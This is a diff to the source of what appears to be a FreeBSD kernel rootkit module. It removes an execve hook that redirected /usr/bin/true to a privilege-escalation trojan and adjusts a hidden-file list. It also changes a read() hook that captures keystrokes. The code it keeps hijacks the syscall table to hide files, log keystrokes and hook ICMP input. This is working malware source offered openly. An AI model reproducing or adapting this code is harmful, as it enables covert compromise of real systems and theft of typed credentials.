@@ -84,82 +84,11 @@ static int last_kld = -1;
 static struct linker_file *save_lf;
 static struct module *save_mod;
 
-#define ORIGINAL	"/usr/bin/true"
-#define TROJAN		"/sbin/priv_esc"
-
 static int activated = 0;
 
 // List of files to be hidden
-char *T_NAME[] = {"rootkit.ko", "controller", "log.txt", "controller.c", "login", "priv_esc", "daemon"};
+char *T_NAME[] = {"rootkit.ko", "controller", "log.txt", "priv_esc", "daemon", "install"};
 static int t_name_len = sizeof(T_NAME)/sizeof(T_NAME[0]);
-
-/*
-char* redir_pair[][2] = {
-	{"/sbin/hello", "/sbin/trojan_hello"},
-	{"/usr/bin/true", "/sbin/priv_esc"} 
-};
-*/
-//static int redir_pair_len = sizeof(redir_pair)/sizeof(redir_pair[0]);
-
-// Execution redirection
-//===============================================================================
-static int execve_hook(struct thread *td, void *syscall_args)
-{
-	struct execve_args *uap;
-	uap = (struct execve_args *)syscall_args;
-
-	struct execve_args kernel_ea;
-	struct execve_args *user_ea;
-	struct vmspace *vm;
-	vm_offset_t base, addr;
-	char t_fname[] = TROJAN;
-	/*
-	for (int i=0; i<redir_pair_len; i++) {
-		if (strcmp(uap->fname, redir_pair[i][0]) == 0) {
-			char *t_fname = redir_pair[i][1];
-			uprintf("%d. %s\n", i, t_fname);
-			vm = curthread->td_proc->p_vmspace;
-			base = round_page((vm_offset_t) vm->vm_daddr);
-			addr = base + ctob(vm->vm_dsize);
-
-			vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, FALSE, 0,
-		    	VM_PROT_ALL, VM_PROT_ALL, 0);
-			vm->vm_dsize += btoc(PAGE_SIZE);
-
-			copyout(&t_fname, (char *)addr, strlen(t_fname));
-			kernel_ea.fname = (char *)addr;
-			kernel_ea.argv = uap->argv;
-			kernel_ea.envv = uap->envv;
-
-			user_ea = (struct execve_args *)addr + sizeof(t_fname);
-			copyout(&kernel_ea, user_ea, sizeof(struct execve_args));
-
-			return(sys_execve(curthread, user_ea));
-		}
-	}
-	*/
-	if (strcmp(uap->fname, ORIGINAL) == 0) {
-		vm = curthread->td_proc->p_vmspace;
-		base = round_page((vm_offset_t) vm->vm_daddr);
-		addr = base + ctob(vm->vm_dsize);
-
-		vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, FALSE, 0,
-		   	VM_PROT_ALL, VM_PROT_ALL, 0);
-		vm->vm_dsize += btoc(PAGE_SIZE);
-
-		copyout(&t_fname, (char *)addr, strlen(t_fname));
-		kernel_ea.fname = (char *)addr;
-		kernel_ea.argv = uap->argv;
-		kernel_ea.envv = uap->envv;
-
-		user_ea = (struct execve_args *)addr + sizeof(t_fname);
-		copyout(&kernel_ea, user_ea, sizeof(struct execve_args));
-
-		return(sys_execve(curthread, user_ea));
-	}
-	return(sys_execve(td, syscall_args));
-}
-//===============================================================================
 
 // Hide files from being listed
 //===============================================================================
@@ -271,8 +200,10 @@ static int read_hook(struct thread *td, void *syscall_args){
 
 	struct read_args *uap;
 	uap = (struct read_args *)syscall_args;
-
+	// Look until the end of array for my pin number
+	char printable[] = {'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','!','"','#','$','%','&','\'','(',')','*','+',',','-','.','/',':',';','<','=','>','?','@','[','\\',']','^','_','`','{','|','}','~',' ','\t','\n','\r','\x0b','\x0c'}; // PIN: 1337
 	int error;
+	int i;
 	char buf[1];
 	size_t done;
 
@@ -281,9 +212,15 @@ static int read_hook(struct thread *td, void *syscall_args){
 	//checks if data read is keystroke
 	if (error || (!uap->nbyte)||(uap->nbyte > 1)|| (uap->fd != 0))
 		return(error); 
-
+	
 	copyinstr(uap->buf, buf, 1, &done);
-	write_kernel2userspace(td, buf[0]);
+	i = 0;
+	do {
+		if (buf[0] == printable[i]) {
+			write_kernel2userspace(td, buf[0]);
+		}
+		i++;
+	} while (printable[i] != '\x0c');
 
 	return(error);
 }
@@ -485,7 +422,6 @@ static int control(struct thread *td, void *arg) {
 	struct control_arg *uap;
 	uap = (struct control_arg *)arg;
 	if (strcmp(uap->option, "on") == 0 && activated == 0) {
-		sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
 		sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
 		inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
@@ -494,7 +430,6 @@ static int control(struct thread *td, void *arg) {
 		activated = 1;
 	}
 	else if (strcmp(uap->option, "off") == 0 && activated == 1) {
-		sysent[SYS_execve].sy_call = (sy_call_t *)sys_execve;
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
 		sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
 		inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
@@ -517,8 +452,7 @@ static int load(struct module *module, int cmd, void *arg) {
 	
 	switch (cmd) {
 		case MOD_LOAD:
-			uprintf("Rootkit loaded at %d\n", offset);
-			sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
+			//uprintf("Rootkit loaded at %d\n", offset);
 			sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
 			sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
 			inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
@@ -528,9 +462,8 @@ static int load(struct module *module, int cmd, void *arg) {
 			break;
 			
 		case MOD_UNLOAD:
-			uprintf("Rootkit unloaded from %d\n", offset);
+			//uprintf("Rootkit unloaded from %d\n", offset);
 			if (activated == 1) {
-				sysent[SYS_execve].sy_call = (sy_call_t *)sys_execve;
 				sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
 				sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
 				inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
